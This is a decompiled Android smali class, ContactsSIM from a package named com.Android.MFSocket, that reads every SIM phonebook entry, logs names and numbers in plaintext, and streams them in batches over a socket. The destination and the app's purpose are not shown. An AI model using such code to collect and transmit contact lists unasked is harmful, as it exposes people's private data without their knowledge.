.class public Lcom/Android/MFSocket/ContactsSIM;
.super Ljava/lang/Object;
.source "ContactsSIM.java"


# instance fields
.field public mResolver:Landroid/content/ContentResolver;


# direct methods
.method constructor <init>(Landroid/content/ContentResolver;)V
    .locals 0
    .param p1, "contentResolver"    # Landroid/content/ContentResolver;

    .prologue
    .line 13
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 14
    iput-object p1, p0, Lcom/Android/MFSocket/ContactsSIM;->mResolver:Landroid/content/ContentResolver;

    .line 15
    return-void
.end method


# virtual methods
.method getContact(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 12
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "contatMsg"    # Ljava/lang/StringBuffer;
    .param p3, "oneTimeCount"    # I

    .prologue
    .line 18
    iget-object v0, p0, Lcom/Android/MFSocket/ContactsSIM;->mResolver:Landroid/content/ContentResolver;

    if-nez v0, :cond_0

    .line 62
    :goto_0
    return-void

    .line 22
    :cond_0
    const/4 v11, 0x0

    .line 23
    .local v11, "phonename":Ljava/lang/String;
    const/4 v10, 0x0

    .line 25
    .local v10, "phoneNo":Ljava/lang/String;
    :try_start_0
    const-string v0, "content://icc/adn"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 26
    .local v1, "simUri":Landroid/net/Uri;
    iget-object v0, p0, Lcom/Android/MFSocket/ContactsSIM;->mResolver:Landroid/content/ContentResolver;

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 28
    .local v7, "cursorSim":Landroid/database/Cursor;
    const-string v0, "PhoneContact"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "total: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-interface {v7}, Landroid/database/Cursor;->getCount()I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 29
    invoke-interface {v7}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-eqz v0, :cond_5

    .line 30
    const/4 v9, 0x0

    .line 31
    .local v9, "nSendCount":I
    new-instance v6, Ljava/lang/StringBuffer;

    invoke-direct {v6}, Ljava/lang/StringBuffer;-><init>()V

    .line 32
    .local v6, "count":Ljava/lang/StringBuffer;
    invoke-interface {v7}, Landroid/database/Cursor;->getCount()I

    move-result v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    .line 33
    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 35
    :cond_1
    const-string v0, "name"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v11

    .line 36
    const-string v0, "number"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    .line 37
    if-eqz v10, :cond_2

    .line 38
    const-string v0, "\\D"

    const-string v2, ""

    invoke-virtual {v10, v0, v2}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 39
    const-string v0, "&"

    const-string v2, ""

    invoke-virtual {v10, v0, v2}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 41
    :cond_2
    if-eqz v11, :cond_3

    .line 42
    const-string v0, "|"

    const-string v2, ""

    invoke-virtual {v11, v0, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v11

    .line 45
    :cond_3
    const-string v0, "PhoneContact"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "name: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " phone: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 46
    invoke-static {v11, p2}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 47
    invoke-static {v10, p2}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 48
    invoke-static {p2}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 49
    add-int/lit8 v9, v9, 0x1

    .line 50
    rem-int v0, v9, p3

    if-nez v0, :cond_4

    .line 51
    invoke-virtual {p2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 52
    const/4 v0, 0x0

    invoke-virtual {p2, v0}, Ljava/lang/StringBuffer;->setLength(I)V

    .line 54
    :cond_4
    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_1

    .line 57
    .end local v6    # "count":Ljava/lang/StringBuffer;
    .end local v9    # "nSendCount":I
    :cond_5
    invoke-virtual {p2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 58
    const/4 v0, 0x0

    invoke-virtual {p2, v0}, Ljava/lang/StringBuffer;->setLength(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    .line 59
    .end local v1    # "simUri":Landroid/net/Uri;
    .end local v7    # "cursorSim":Landroid/database/Cursor;
    :catch_0
    move-exception v8

    .line 60
    .local v8, "e":Ljava/lang/Exception;
    invoke-virtual {v8}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_0
.end method
